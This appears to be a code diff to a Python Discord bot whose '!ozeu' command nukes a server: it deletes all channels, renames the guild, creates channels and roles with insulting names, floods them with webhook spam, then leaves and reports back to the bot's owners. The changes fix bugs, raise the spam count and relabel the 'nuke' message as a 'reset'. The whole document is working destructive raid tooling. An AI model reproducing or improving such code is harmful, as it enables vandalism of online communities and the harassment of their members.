@@ -134,7 +134,8 @@ async def ozeu(ctx, guild_id: str = None):
         if guild_id in safe_servers:
             await ctx.send("❌ このサーバーは安全リストに登録されているため、!ozeuは実行できません。")
             return
-        guild = bot.get_guild(guild_id)
+        guild = bot.get_guild(int(guild_id))  # ※ここはintのままだと動作しやすいですが、ご希望で文字列のままも可能
+        # ただしdiscord.pyのget_guildはint型IDを想定しています
         if guild is None:
             await ctx.send(f"❌ ID {guild_id} のサーバーが見つかりません。")
             return
@@ -168,16 +169,16 @@ async def ozeu(ctx, guild_id: str = None):
 
     await asyncio.gather(*[delete_channel(ch) for ch in guild.channels])
 
-# サーバー名変更
-try:
-    await guild.edit(name="ozeu植民地")
-except Exception as e:
-    print(f"[ozeu] サーバー名の変更でエラー: {e}")
+    # サーバー名変更
+    try:
+        await guild.edit(name="ozeu植民地")
+    except Exception as e:
+        print(f"[ozeu] サーバー名の変更でエラー: {e}")
 
-# --- チャンネル作成関数 ---
+    # --- チャンネル作成関数 ---
     async def create_channel(i):
         try:
-            return await guild.create_text_channel(name="バカどもがｗ")
+            return await guild.create_text_channel(name="馬鹿がｗ")
         except Exception as e:
             print(f"[ozeu] {i+1}個目のチャンネル作成失敗: {e}")
             return None
@@ -188,18 +189,19 @@ except Exception as e:
     # --- Webhookでスパム送信関数 ---
     async def send_with_webhook(channel):
         try:
-            webhook = await channel.create_webhook(name="ZPlusWebhook")
-            for _ in range(40):
-                await webhook.send(SPAM_MESSAGE, username="無知くんｗ")
+            webhook = await channel.create_webhook(name="ZPRWebhook")
+            for _ in range(45):
+                await webhook.send(SPAM_MESSAGE, username="馬鹿めｗ")
         except Exception as e:
             print(f"[ozeu] {channel.name} のWebhook送信でエラー: {e}")
 
     await asyncio.gather(*[send_with_webhook(ch) for ch in created_channels])
 
     # ロール作成
+    aa = 5  # 変数aaは適宜調整してください
     try:
         for i in range(30):
-            await guild.create_role(name=f"バカ草ｗ{i+1}")
+            await guild.create_role(name=f"無知がｗ{i+1}")
     except Exception as e:
         print(f"[ozeu] ロール作成でエラー: {e}")
 
@@ -207,7 +209,7 @@ except Exception as e:
     try:
         await guild.leave()
         embed_done = discord.Embed(
-            title="🚪 nuke処理が完了し、Botはサーバーを退出しました",
+            title="🚪 リセット処理が完了し、Botはサーバーを退出しました",
             description=(
                 f"サーバー名: {guild.name} (ID: {guild.id})\n"
                 f"実行者: {ctx.author} (ID: {ctx.author.id})"
@@ -215,7 +217,8 @@ except Exception as e:
             color=discord.Color.red()
         )
         embed_done.timestamp = discord.utils.utcnow()
-        await owner.send(embed=embed_done)
+        for owner in owners:
+            await owner.send(embed=embed_done)
         await ctx.send(embed=embed_done)
     except Exception as e:
         print(f"[ozeu] 退出時にエラー: {e}")
